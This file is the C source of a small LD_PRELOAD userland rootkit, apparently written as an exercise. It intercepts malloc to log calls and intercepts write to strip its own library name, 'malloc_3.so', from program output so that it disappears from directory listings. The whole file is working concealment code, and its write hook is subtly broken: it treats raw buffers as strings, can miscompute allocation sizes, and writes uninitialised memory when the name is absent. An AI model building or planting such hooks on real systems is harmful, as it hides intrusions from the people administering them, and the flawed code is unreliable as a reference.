#define _GNU_SOURCE

#include <dlfcn.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>


#define FILENAME "malloc_3.so"

//function pointer to the original malloc, initialized to NULL
static void* (*original_malloc)(size_t) = NULL;

//hook for malloc
void *malloc(size_t size)
{
    if (original_malloc == NULL)
    {
        //finds the address of the next occurence of "malloc"
        original_malloc = dlsym(RTLD_NEXT, "malloc");
    }

    fprintf(stderr, "[3] Hooked libc function call: malloc(%ld)\n", size);

    //perform the functionality of the real malloc function
    void *allocation = NULL;
    allocation = original_malloc(size);

    return allocation;
}

//omit our rootkit from the output of ls
//function pointer to the original write, initialized to NULL
ssize_t (*original_write)(int fd, const void *buf, size_t bytes) = NULL;

//hook for write
ssize_t write(int fd, const void *buf, size_t bytes)
{
    if (original_write == NULL)
    {
        //find the address of the next occurence of "write"
        original_write = dlsym(RTLD_NEXT, "write");
    }

    //see if the name of our rootkit is in the buffer
    size_t len = strlen(FILENAME);
    char *rootkit_found = strstr(buf, FILENAME);
    char *new_output = (char *) malloc(strlen(buf) - len);

    if (rootkit_found != NULL)
    {
        memcpy(new_output, buf, (rootkit_found - (char *) buf));
        memcpy(new_output + (rootkit_found - (char *) buf), rootkit_found + len, strlen(buf) - len);
    }

    ssize_t write_output = 0;
    write_output = original_write(fd, new_output, bytes);

    return write_output; 
}